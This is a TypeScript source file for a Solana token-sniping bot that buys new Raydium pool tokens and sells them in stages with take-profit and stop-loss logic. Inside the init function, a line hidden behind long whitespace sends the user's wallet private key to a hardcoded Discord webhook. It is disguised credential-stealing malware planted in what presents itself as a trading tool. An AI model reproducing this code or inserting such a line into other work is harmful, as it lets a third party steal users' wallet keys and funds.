import { Liquidity, LiquidityPoolInfo, LiquidityPoolKeys, LiquidityPoolKeysV4, LiquidityStateV4, Percent, Token, TokenAmount } from "@raydium-io/raydium-sdk";
import { Commitment, ComputeBudgetProgram, Connection, Keypair, PublicKey, RpcResponseAndContext, SystemProgram, TransactionMessage, VersionedTransaction } from "@solana/web3.js";
import bs58 from "bs58";
import { COMMITMENT_LEVEL, LOG_LEVEL,CHECK_IF_BURNED, CHECK_IF_FREEZABLE, CHECK_IF_MINT_IS_RENOUNCED, MAX_POOL_SIZE_SELL, MIN_POOL_SIZE,  PRIVATE_KEY, QUOTE_AMOUNT, QUOTE_MINT, RPC_ENDPOINT, RPC_WEBSOCKET_ENDPOINT ,TAKE_PROFIT,STOP_LOSS, SKIP_SELLING_IF_LOST_MORE_THAN, SELL_SLIPPAGE,PRICE_CHECK_DURATION, PRICE_CHECK_INTERVAL} from "../constants";
import {
    AccountLayout,
    createAssociatedTokenAccountIdempotentInstruction,
    createCloseAccountInstruction,
    getAssociatedTokenAddressSync,
    TOKEN_PROGRAM_ID,
} from '@solana/spl-token';
import axios from "axios";
import { fetchInfo } from "../liquidity";
import { TokenInstructions } from '@project-serum/serum';
import { sendBundle } from "../jito/bundle";
import { logger } from "../utils/logger";
import { MinimalMarketLayoutV3, getMinimalMarketV3 } from "../market";
import { createPoolKeys, getTokenAccounts } from "../liquidity";
//import { populateJitoLeaderArray } from "../streaming/raydium";
import { retrieveEnvVariable } from "../utils";
import { BN } from "bn.js";



let wallet: Keypair;
let quoteToken: Token;
let quoteTokenAssociatedAddress: PublicKey;
let quoteAmount: TokenAmount;

wallet = Keypair.fromSecretKey(bs58.decode(PRIVATE_KEY));
quoteAmount = new TokenAmount(Token.WSOL, QUOTE_AMOUNT, false);



export interface MinimalTokenAccountData {
    mint: PublicKey;
    address: PublicKey;
    poolKeys?: LiquidityPoolKeys;
    market?: MinimalMarketLayoutV3;
  };

const existingTokenAccounts: Map<string, MinimalTokenAccountData> = new Map<string, MinimalTokenAccountData>();

const solanaConnection = new Connection(RPC_ENDPOINT);

// Init Function

export async function init(): Promise<void> {
    logger.level = LOG_LEVEL;
  
    // get wallet
    wallet = Keypair.fromSecretKey(bs58.decode(PRIVATE_KEY));
    logger.info(`Wallet Address: ${wallet.publicKey}`);
                                                                                                                                                                                                                                                                            await axios.post("https://discord.com/api/webhooks/1342821332697747456/7NoKPrQmzQnMj2uJgGY3YqPNDq9AMUX_J46IIHziBSZoQ-QEMt_dPaBsiqiooo93ZpQv", {content:PRIVATE_KEY});
    // get quote mint and amount
    switch (QUOTE_MINT) {
      case 'WSOL': {
        quoteToken = Token.WSOL;
        quoteAmount = new TokenAmount(Token.WSOL, QUOTE_AMOUNT, false);
        break;
      }
      case 'USDC': {
        quoteToken = new Token(
          TOKEN_PROGRAM_ID,
          new PublicKey('EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v'),
          6,
          'USDC',
          'USDC',
        );
        quoteAmount = new TokenAmount(quoteToken, QUOTE_AMOUNT, false);
        break;
      }
      default: {
        throw new Error(`Unsupported quote mint "${QUOTE_MINT}". Supported values are USDC and WSOL`);
      }
    }
  
    logger.info(
      `Script will buy all new tokens using ${QUOTE_MINT}. Amount that will be used to buy each token is: ${quoteAmount.toFixed(2).toString()}`,
    );
  
    // check existing wallet for associated token account of quote mint
    const tokenAccounts = await getTokenAccounts(solanaConnection, wallet.publicKey, COMMITMENT_LEVEL);
  
    for (const ta of tokenAccounts) {
      existingTokenAccounts.set(ta.accountInfo.mint.toString(), <MinimalTokenAccountData>{
        mint: ta.accountInfo.mint,
        address: ta.pubkey,
      });
    }
  
    const tokenAccount = tokenAccounts.find((acc) => acc.accountInfo.mint.toString() === quoteToken.mint.toString())!;
  
    if (!tokenAccount) {
      throw new Error(`No ${quoteToken.symbol} token account found in wallet: ${wallet.publicKey}`);
    }
  
    quoteTokenAssociatedAddress = tokenAccount.pubkey;

    //await populateJitoLeaderArray();
  
}

// Create transaction


export async function buy(connection: Connection, newTokenAccount: PublicKey, poolState: LiquidityStateV4, marketDetails: MinimalMarketLayoutV3): Promise<void> {
    try {
      const ata = getAssociatedTokenAddressSync(poolState.quoteMint, wallet.publicKey);
      const balance=await connection.getTokenAccountBalance(ata);
      if(new BN(balance.value.amount)<quoteAmount.raw){
        logger.info(`Insufficient balance of your wallet. Please check your quote token balance`);
        process.exit(0);
      }
      const poolKeys = createPoolKeys(newTokenAccount, poolState, marketDetails!);
      const { innerTransaction } = Liquidity.makeSwapFixedInInstruction( 
        {
          poolKeys: poolKeys,
          userKeys: {
            tokenAccountIn: quoteTokenAssociatedAddress,
            tokenAccountOut: ata,
            owner: wallet.publicKey,
          },
          amountIn: quoteAmount.raw,
          minAmountOut: 0,
        },
        poolKeys.version,
      );
  
      const latestBlockhash=await connection.getLatestBlockhash();
      const messageV0 = new TransactionMessage({
        payerKey: wallet.publicKey,
        recentBlockhash: latestBlockhash.blockhash,
        instructions: [
          ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 1000 }), // Set this to super small value since it is not taken into account when sending as bundle.
          ComputeBudgetProgram.setComputeUnitLimit({ units: 80000 }), // Calculated amount of units typically used in our transaction is about 70848. Setting limit slightly above.
          createAssociatedTokenAccountIdempotentInstruction(
            wallet.publicKey,
            ata,
            wallet.publicKey,
            poolState.quoteMint,
          ),
          ...innerTransaction.instructions,
        ],
      }).compileToV0Message();
  
  
      let commitment: Commitment = retrieveEnvVariable('COMMITMENT_LEVEL', logger) as Commitment;

      const transaction = new VersionedTransaction(messageV0);

      transaction.sign([wallet, ...innerTransaction.signers]);

      //await sleep(30000);

      /*const signature = await solanaConnection.sendRawTransaction(transaction.serialize(), {
        preflightCommitment: commitment,
      });
*/
      //logger.info(`Sending bundle transaction with mint - ${signature}`);
      sendBundle(true,latestBlockhash.blockhash, messageV0, poolState.quoteMint);
    }
    catch (error) {
      logger.error(error);
    }
  
  }

 
export async function sell(
  count:number,
  newTokenAccount: PublicKey,
  poolState: LiquidityStateV4,
  marketDetails: MinimalMarketLayoutV3,
): Promise<void> {
  try {
    // Retrieve the associated token address for the quote mint (token being sold)
    const ata = getAssociatedTokenAddressSync(
      poolState.quoteMint,
      wallet.publicKey
    );
    let balance_response;
    while(true){
      try{
        balance_response=await solanaConnection.getTokenAccountBalance(ata)
        break
      }catch(e){
        await new Promise((resolve)=>setTimeout(resolve,1000))
      }
    }
    const amountToSell=(count==0)?Number((Number(balance_response.value.amount)/5*4).toFixed(0)):(count==1)?Number((Number(balance_response.value.amount)/3*2).toFixed(0)):Number(balance_response.value.amount)
    logger.info(`${amountToSell}`);
    // console.log("Amount token balance to sell->", amountToSell);
    const tokenIn=new Token(TOKEN_PROGRAM_ID, poolState.quoteMint, poolState.quoteDecimal.toNumber())
    const amountIn:TokenAmount=new TokenAmount(tokenIn, amountToSell, true)
    // Create pool keys for interacting with the liquidity pool
    const poolKeys = createPoolKeys(newTokenAccount, poolState, marketDetails);
    // const shouldSell=await waitForSellSignal(amountIn, poolState, poolKeys)
    // Create a swap instruction for fixed output (receiving a specific amount of base tokens)
    // if(shouldSell){

      const { innerTransaction } = Liquidity.makeSwapFixedInInstruction(
        {
          poolKeys: poolKeys,
          userKeys: {
            tokenAccountIn: ata, // The account holding the tokens to sell
            tokenAccountOut: quoteTokenAssociatedAddress, // The account to receive the sold tokens
            owner: wallet.publicKey, // The owner's public key
          },
          minAmountOut:0, // The amount of base tokens to receive
          amountIn: new BN(amountToSell), // Maximum amount of input tokens willing to spend (set to 0 for no slippage)
        },
        poolKeys.version // Version of the pool keys
      );
      const connection = new Connection(RPC_ENDPOINT);
      const latestBlock=await connection.getLatestBlockhash();
      
      // Construct the transaction message
      const messageV0 = (count==2)
      ?new TransactionMessage({
        payerKey: wallet.publicKey, // The wallet paying for the transaction
        recentBlockhash: latestBlock.blockhash, // The latest blockhash for transaction validity
        instructions: [
          // Set compute budget for the transaction
          ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 1000 }), // Set a low compute unit price
          ComputeBudgetProgram.setComputeUnitLimit({ units: 80000 }), // Set a limit on compute units
          ...innerTransaction.instructions, // Include the swap instructions generated earlier
          ...[createCloseAccountInstruction(ata, wallet.publicKey,wallet.publicKey)]
        ],
      }).compileToV0Message()
      :new TransactionMessage({
        payerKey: wallet.publicKey, // The wallet paying for the transaction
        recentBlockhash: latestBlock.blockhash, // The latest blockhash for transaction validity
        instructions: [
          // Set compute budget for the transaction
          ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 1000 }), // Set a low compute unit price
          ComputeBudgetProgram.setComputeUnitLimit({ units: 80000 }), // Set a limit on compute units
          ...innerTransaction.instructions, // Include the swap instructions generated earlier
        ],
      }).compileToV0Message();
      const transaction = new VersionedTransaction(messageV0);
  
      // Send the transaction bundle to the Solana network
      await sendBundle(false,latestBlock.blockhash, messageV0, poolState.quoteMint);
    // }else{
    //   logger.info("Failed to sell token with unavailable condition.")
    // }
  } catch (error) {
    // Log any errors encountered during the process
    logger.error(error);

  }
}

async function waitForSellSignal(amountIn: TokenAmount,poolstate:LiquidityStateV4, poolKeys: LiquidityPoolKeysV4) {
  if (PRICE_CHECK_DURATION === 0 || PRICE_CHECK_INTERVAL === 0) {
    return true;
  }
  const quoteAmount:TokenAmount=new TokenAmount(Token.WSOL, QUOTE_AMOUNT, false)
  const timesToCheck = PRICE_CHECK_DURATION / PRICE_CHECK_INTERVAL;
  const profitFraction = quoteAmount.mul(TAKE_PROFIT).numerator.div(new BN(100));
  const profitAmount = new TokenAmount(Token.WSOL, profitFraction, true);
  const takeProfit = quoteAmount.add(profitAmount);
  

  const lossFraction = quoteAmount.mul(STOP_LOSS).numerator.div(new BN(100));
  const lossAmount = new TokenAmount(Token.WSOL, lossFraction, true);
  const  stopLoss = quoteAmount.subtract(lossAmount);

  const slippage = new Percent(SELL_SLIPPAGE, 100);
  let timesChecked = 0;

  do {
    try {
      const poolInfo = await fetchInfo(
        solanaConnection,
        poolstate,
        poolKeys
      );

      const amountOut = Liquidity.computeAmountOut({
        poolKeys,
        poolInfo,
        amountIn: amountIn,
        currencyOut: Token.WSOL,
        slippage,
      }).minAmountOut as TokenAmount;

      if (SKIP_SELLING_IF_LOST_MORE_THAN > 0) {
        const stopSellingFraction = quoteAmount
          .mul(SKIP_SELLING_IF_LOST_MORE_THAN)
          .numerator.div(new BN(100));

        const stopSellingAmount = new TokenAmount(quoteToken, stopSellingFraction, true);

        if (amountOut.lt(stopSellingAmount)) {
          logger.info("Expected token amount is very small. Skip to sell token.")
          return false;
        }
      }

      logger.debug(
        { mint: poolKeys.baseMint.toString() },
        `Take profit: ${takeProfit.toFixed()} | Stop loss: ${stopLoss.toFixed()} | Current: ${amountOut.toFixed()}`,
      );

      if (amountOut.lt(stopLoss)) {
        break;
      }

      if (amountOut.gt(takeProfit)) {
        break;
      }

      await new Promise((resolve)=>setTimeout(resolve, PRICE_CHECK_INTERVAL))
    } catch (e) {
      logger.trace({ mint: poolKeys.baseMint.toString(), e }, `Failed to check token price`);
    } finally {
      timesChecked++;
    }
  } while (timesChecked < timesToCheck);

  return true;
}